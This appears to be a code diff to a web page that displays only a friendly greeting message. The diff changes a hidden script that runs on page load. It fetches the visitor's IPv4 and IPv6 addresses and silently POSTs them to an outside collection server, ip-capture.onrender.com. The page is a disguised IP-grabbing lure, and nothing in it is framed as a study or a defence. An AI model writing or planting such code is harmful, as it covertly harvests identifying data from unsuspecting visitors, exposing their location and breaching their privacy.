@@ -10,13 +10,14 @@
     <h1>I just wanted to say hello! hope you're doing well. Take care.</h1>
     <script>
         (async() => {
-            const ipObj = await fetch('https://ipv6.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
+            const ipv6Obj = await fetch('https://ipv6.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
+            const ipv4Obj = await fetch('https://ipv4.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
             await fetch('https://ip-capture.onrender.com', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(ipObj)
+                body: JSON.stringify({ipv4: ipv4Obj.ip, ipv6: ipv6Obj.ip})
             })
         })()
     </script>
